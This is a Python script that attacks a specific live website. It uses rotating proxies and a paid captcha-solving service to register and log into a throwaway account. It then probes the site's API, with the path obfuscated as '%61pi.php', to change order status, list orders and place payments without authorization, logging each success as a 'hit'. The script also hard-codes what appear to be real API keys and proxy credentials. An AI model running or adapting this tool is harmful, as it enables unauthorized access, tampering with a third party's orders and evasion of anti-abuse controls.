#!/usr/bin/env python3
"""Register qq1 user via 2Captcha, then probe API change/orders with that account."""
import json
import re
import subprocess
import time
import urllib.parse
from datetime import datetime
from pathlib import Path

BASE = "https://qq1.lol"
OUT = Path("/tmp/qq1_deep8")
OUT.mkdir(exist_ok=True)
LOG = OUT / "userreg.log"
HITS = OUT / "hits.jsonl"
JAR = str(OUT / "userreg.jar")
KEY = "685ea1068774ca8f8e9a292a08da66d6"
QG, PW = "C413ED6D", "344F550A6F8B"
_px = None


def log(m):
    line = f"[{datetime.now():%H:%M:%S}] {m}"
    print(line, flush=True)
    open(LOG, "a").write(line + "\n")


def hit(kind, detail, body=""):
    open(HITS, "a").write(json.dumps({"kind": kind, "detail": detail, "body": (body or "")[:8000]}, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:250]}")


def fresh():
    global _px
    for area in ("440000", "0", "330000", "320000"):
        try:
            d = json.loads(subprocess.check_output(
                ["curl", "-s", "--max-time", "10",
                 f"https://share.proxy.qg.net/get?key={QG}&num=1&area={area}"],
                text=True, timeout=12))
            if d.get("code") != "SUCCESS":
                d = json.loads(subprocess.check_output(
                    ["curl", "-s", f"https://share.proxy.qg.net/query?key={QG}"], text=True, timeout=12))
            for x in d.get("data") or []:
                cand = f"http://{QG}:{PW}@{x['server']}"
                code = subprocess.run(
                    ["curl", "-sk", "--max-time", "10", "-x", cand, "-o", "/tmp/t.out",
                     "-w", "%{http_code}", f"{BASE}/%61pi.php?act=siteinfo"],
                    capture_output=True, text=True, timeout=14).stdout.strip()
                if code == "200" and b"sitename" in open("/tmp/t.out", "rb").read():
                    _px = cand
                    log(f"px {x['server']}")
                    return _px
        except Exception as e:
            log(f"px err {e}")
        time.sleep(1)
    return _px


def curl(url, post=None, mt=18):
    global _px
    if not _px:
        fresh()
    for _ in range(4):
        cmd = ["curl", "-sk", "--max-time", str(mt), "-x", _px, "-b", JAR, "-c", JAR,
               "-A", "Mozilla/5.0", "-H", "Referer: https://qq1.lol/user/reg.php",
               "-H", "X-Requested-With: XMLHttpRequest",
               "-w", "\n__HTTP:%{http_code}"]
        if post is not None:
            body = urllib.parse.urlencode(post) if isinstance(post, dict) else str(post)
            cmd += ["-X", "POST", "--data-binary", body,
                    "-H", "Content-Type: application/x-www-form-urlencoded"]
        cmd.append(url)
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=mt + 6).stdout or ""
        if "authorization expired" in out or "__HTTP:" not in out:
            fresh()
            continue
        b, code = out.rsplit("__HTTP:", 1)
        return b.strip(), code.strip()
    return "", "000"


def solve(gt, challenge):
    task = {"type": "GeeTestTaskProxyless", "websiteURL": BASE + "/user/reg.php",
            "gt": gt, "challenge": challenge}
    d = json.loads(subprocess.check_output(
        ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
         "-d", json.dumps({"clientKey": KEY, "task": task}),
         "https://api.2captcha.com/createTask"], text=True, timeout=35))
    if d.get("errorId"):
        raise RuntimeError(str(d))
    tid = d["taskId"]
    log(f"task {tid}")
    for _ in range(30):
        time.sleep(4)
        d = json.loads(subprocess.check_output(
            ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
             "-d", json.dumps({"clientKey": KEY, "taskId": tid}),
             "https://api.2captcha.com/getTaskResult"], text=True, timeout=25))
        if d.get("errorId"):
            raise RuntimeError(str(d))
        if d.get("status") == "ready":
            return d["solution"]
    raise RuntimeError("timeout")


def main():
    open(LOG, "w").write("")
    log("=== USER REG + API PROBE ===")
    fresh()
    Path(JAR).unlink(missing_ok=True)

    # load reg page for hashsalt
    reg, _ = curl(BASE + "/user/reg.php")
    (OUT / "reg.html").write_text(reg or "", errors="replace")
    hs_m = re.search(r"var hashsalt=(.+);", reg or "")
    if not hs_m:
        log("no hashsalt"); return
    try:
        hs = subprocess.run(
            ["node", "-e", f"var hashsalt={hs_m.group(1)}; console.log(hashsalt)"],
            capture_output=True, text=True, timeout=5).stdout.strip()
    except Exception:
        hs = hs_m.group(1).strip().strip("'\"")
    log(f"hashsalt={hs[:20]}...")

    user = "p" + str(int(time.time()) % 10000000)
    pwd = "Test" + str(int(time.time()) % 100000) + "x"
    qq = "123456789"

    # captcha
    cap_b, _ = curl(BASE + f"/ajax.php?act=captcha&t={int(time.time()*1000)}")
    cap = json.loads(cap_b)
    log(f"gt={cap.get('gt','')[:16]}")
    sol = solve(cap["gt"], cap["challenge"])
    log(f"solved validate={sol.get('validate','')[:16]}")

    # register via /user/ajax.php?act=reguser
    post = {
        "user": user, "pwd": pwd, "qq": qq, "invitecode": "",
        "hashsalt": hs,
        "geetest_challenge": sol.get("challenge") or cap["challenge"],
        "geetest_validate": sol.get("validate", ""),
        "geetest_seccode": sol.get("seccode") or (sol.get("validate", "") + "|jordan"),
    }
    body, code = curl(BASE + "/user/ajax.php?act=reguser", post)
    log(f"reguser HTTP={code} {body}")
    (OUT / "reg_result.json").write_text(body or "")
    if not body or ('"code":1' not in body and "成功" not in body):
        # try without /user prefix
        body2, code2 = curl(BASE + "/ajax.php?act=reguser", post)
        log(f"reguser_root HTTP={code2} {body2}")
        body = body2 or body
        if body and ('"code":1' in body or "成功" in body):
            hit("reg_ok", f"{user}:{pwd}", body)
        else:
            log("reg failed, still try login with credentials")
    else:
        hit("reg_ok", f"{user}:{pwd}", body)

    open(OUT / "creds.txt", "w").write(f"{user}:{pwd}:{qq}\n")

    # login to user panel
    Path(JAR).unlink(missing_ok=True)
    curl(BASE + "/user/login.php")
    cap_b, _ = curl(BASE + f"/ajax.php?act=captcha&t={int(time.time()*1000)}")
    cap = json.loads(cap_b)
    sol = solve(cap["gt"], cap["challenge"])
    login_post = {
        "user": user, "pass": pwd,
        "geetest_challenge": sol.get("challenge") or cap["challenge"],
        "geetest_validate": sol.get("validate", ""),
        "geetest_seccode": sol.get("seccode") or (sol.get("validate", "") + "|jordan"),
    }
    # also try pwd field
    for endpoint, payload in [
        (BASE + "/user/ajax.php?act=login", {**login_post}),
        (BASE + "/user/ajax.php?act=login", {"user": user, "pwd": pwd,
         "geetest_challenge": login_post["geetest_challenge"],
         "geetest_validate": login_post["geetest_validate"],
         "geetest_seccode": login_post["geetest_seccode"]}),
        (BASE + "/ajax.php?act=login", {**login_post}),
    ]:
        b, c = curl(endpoint, payload)
        log(f"login {endpoint.split('/')[-1]} {c} {b[:150]}")
        if b and ('"code":0' in b or '"code":1' in b or "成功" in b):
            hit("login_ok", f"{user}:{pwd}", b)
            break

    # panel pages
    for p in ["/user/", "/user/index.php", "/user/shop.php", "/user/clist.php",
              "/user/recharge.php", "/?mod=panel"]:
        b, c = curl(BASE + p)
        log(f"page {p}: {c} len={len(b or '')} {(b or '')[:100].replace(chr(10),' ')}")
        (OUT / ("after_" + p.strip("/").replace("/", "_") + ".html")).write_text(b or "", errors="replace")

    # API with user/pass — the key pivot
    log("=== API with user creds ===")
    for act, extra in [
        ("change", {"id": "25949", "zt": "1"}),
        ("orders", {"limit": "5", "tid": "102"}),
        ("orders", {"limit": "5", "tid": "102", "sign": "1"}),
        ("search", {"id": "25949"}),
        ("goodslist", {}),
        ("pay", {"tid": "102", "num": "1", "input1": "testapi", "user": user, "pass": pwd}),
    ]:
        # GET id/zt for change
        if act == "change":
            url = f"{BASE}/%61pi.php?act=change&id=25949&zt=1"
            b, c = curl(url, {"user": user, "pass": pwd})
        elif act == "pay":
            b, c = curl(f"{BASE}/%61pi.php?act=pay", extra)
        else:
            b, c = curl(f"{BASE}/%61pi.php?act={act}", {"user": user, "pass": pwd, **extra})
        log(f"api {act}: {c} {(b or '')[:200]}")
        if b and any(x in b for x in ("成功", '"code":1', '"code":0', '"tid"', "修改")) and "不正确" not in b and "请提供" not in b and "错误" not in b:
            hit("api_as_user", act, b)
        time.sleep(0.3)

    # also try with key= empty and session cookie only
    b, c = curl(f"{BASE}/%61pi.php?act=orders&limit=3&tid=102")
    log(f"api orders cookie-only: {c} {(b or '')[:150]}")

    log(f"=== DONE creds={user}:{pwd} ===")


if __name__ == "__main__":
    main()
